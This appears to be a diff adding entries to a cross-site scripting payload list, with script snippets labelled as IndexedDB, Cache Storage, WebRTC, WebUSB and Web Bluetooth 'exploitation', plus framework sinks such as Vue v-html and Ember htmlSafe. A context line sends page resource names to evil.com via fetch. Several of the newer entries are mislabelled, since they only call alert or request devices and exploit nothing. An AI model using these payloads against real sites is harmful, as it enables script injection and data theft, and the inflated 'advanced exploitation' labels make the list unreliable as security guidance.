@@ -126,6 +126,27 @@ caches.open('xss').then(cache =>
 document.cookie='session=<script>alert(1)<\/script>';
 </script>
 
+# Advanced IndexedDB Exploitation
+<script>
+let db = indexedDB.open('xss', 1);
+db.onupgradeneeded = e => {
+  let store = e.target.result.createObjectStore('store');
+  store.put('<script>alert(1)</script>', 'key');
+};
+db.onsuccess = e => {
+  let tx = e.target.result.transaction('store', 'readwrite');
+  tx.objectStore('store').get('key').onsuccess = e => eval(e.target.result);
+};
+</script>
+
+# Advanced Cache Poisoning
+<script>
+caches.open('xss').then(cache => {
+  cache.put('/evil', new Response('<script>alert(1)</script>'));
+  cache.match('/evil').then(res => res.text().then(eval));
+});
+</script>
+
 # Advanced Frame Manipulation
 <script>
 // Frame Navigation
@@ -332,4 +353,24 @@ fetch('https://evil.com/?'+performance.getEntriesByType('resource').map(e=>e.nam
 <div v-html="'<img src=x onerror=alert(1)>'"></div>
 
 // Ember.js
-{{{htmlSafe "<img src=x onerror=alert(1)>"}}} 
+{{{htmlSafe "<img src=x onerror=alert(1)>"}}}
+
+# Advanced WebRTC Exploitation
+<script>
+let pc = new RTCPeerConnection();
+pc.createDataChannel('xss').send('<script>alert(1)</script>');
+</script>
+
+# Advanced WebUSB Exploitation
+<script>
+navigator.usb.requestDevice({filters: []}).then(device => {
+  alert('USB Device: ' + device.productName);
+});
+</script>
+
+# Advanced Web Bluetooth Exploitation
+<script>
+navigator.bluetooth.requestDevice({acceptAllDevices: true}).then(device => {
+  alert('Bluetooth Device: ' + device.name);
+});
+</script>
